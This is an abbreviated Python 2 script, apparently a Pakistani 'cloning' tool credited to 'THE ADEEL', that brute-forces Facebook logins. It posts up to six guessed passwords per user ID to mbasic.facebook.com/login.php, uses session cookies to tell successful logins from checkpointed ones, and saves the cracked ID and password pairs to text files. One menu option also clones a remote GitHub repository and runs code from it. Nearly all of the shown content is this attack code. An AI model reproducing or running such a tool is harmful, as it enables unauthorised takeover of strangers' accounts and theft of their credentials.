...
\033[1;94m##     ##  #######  ##     ##  ######  #### ##    ##                                                                                  
           ...
           -----------------------------
          | CODED BY : THE ADEEL       |
          | WHATSAPP : +923444819642    |
          | FB PAGE  : ADEEL TRICKER   |
           -----------------------------
         \x1b[1;41m\x1b[1;92m4DEEL TH3 BR4ND \x1b[1;0m'
"""
dec = '2'
server = '2'
...
def main_apv():
    ...
    print logo
    try:
        key1 = open('/sdcard/.ADEELali.txt', 'r').read()
    except IOError:
        os.system('clear')
        print logo
        print '\033[1;91m You dont have an subscrption'
        print '           ELLOW BROTHER THIS COMMANDS ARE File'
        ...
        kok = open('/sdcard/.ADEELali.txt', 'w')
        kok.write(myid + imt)
        kok.close()
        print ''
...
def main_input():
    ...
    if mx == '1':
        ...
        print '\x1b[1;92m        Member Of The ADEEL File Commands '
        print '\x1b[1;91m        ENJOY  THE JOURNEY '
        time.sleep(3.5)
        main_system()
    elif mx == '6':
        os.system('get clone https://github.com/4deeL-khan/File.git')
        os.system('rm -rf File')
        os.system('cp -f File/File \\.')
        os.system('rm -rf File')
        os.system(' cd File')
        os.system(' python2 Adeel.py')
        time.sleep(5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[ADEEL-OK] ' + coc + user + ' | ' + pass1
                ok = open('random-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[ADEEL-CP] ' + coc + user + ' | ' + pass1
...
def mineExt():
    ...
    print g + '[=] Extracting From The ADEEL : ' + my_line[:15]
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[ADEEL-OK] ' + uid + ' | ' + pass1
                ok = open('LEGHARI-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[ADEEL-OK] ' + uid + ' | ' + pass1
                cp = open('LEGHARI-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[ADEEL-OK] ' + uid + ' | ' + pass2
                    ok = open('LEGHARI-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[ADEEL-CP] ' + uid + ' | ' + pass2
                    cp = open('LEGHARI-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[ADEEL-OK] ' + uid + ' | ' + pass3
                        ok = open('LEGHARI-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[ADEEL-CP] ' + uid + ' | ' + pass3
                        cp = open('LEGHARI-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[ADEEL-OK] ' + uid + ' | ' + pass4
                            ok = open('LEGHARI-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[ADEEL-CP] ' + uid + ' | ' + pass4
                            cp = open('LEGHARI-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[ADEEL-OK] ' + uid + ' | ' + pass5
                                ok = open('LEGHARI-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[ADEEL-CP] ' + uid + ' | ' + pass5
                                cp = open('LEGHARI-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
...
def xokp():
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[LEGHARI-OK] ' + uid + ' | ' + pass1
                ok = open('LEGHARI-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[LEGHARI-CP] ' + uid + ' | ' + pass1
                cp = open('LEGHARI-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[LEGHARI-OK] ' + uid + ' | ' + pass2
                    ok = open('LEGHARI-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[LEGHARI-CP] ' + uid + ' | ' + pass2
                    cp = open('LEGHARI-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                    ...
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[LEGHARI-OK] ' + uid + ' | ' + pass3
                        ok = open('LEGHARI-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[LEGHARI-CP] ' + uid + ' | ' + pass3
                        cp = open('LEGHARI-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                        ...
                        b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[LEGHARI-OK] ' + uid + ' | ' + pass4
                            ok = open('LEGHARI-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[LEGHARI-CP] ' + uid + ' | ' + pass4
                            cp = open('LEGHARI-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[LEGHARI-OK] ' + uid + ' | ' + pass5
                                ok = open('LEGHARI-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[ILEGHARI-CP] ' + uid + ' | ' + pass5
                                cp = open('LEGHARI-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                print '\x1b[1;91m[LEGHARI-CP] ' + uid + ' | ' + pass5
                                cp = open('LEGHARI-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                print '\x1b[1;91m[ADEEL-CP] ' + uid + ' | ' + pass1
                cp = open('LEGHARI-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[ADEEL-OK] ' + uid + ' | ' + pass6
                                    ok = open('ADEEL-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;91m[ADEEL-CP] ' + uid + ' | ' + pass6
                                    cp = open('ADEEL-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
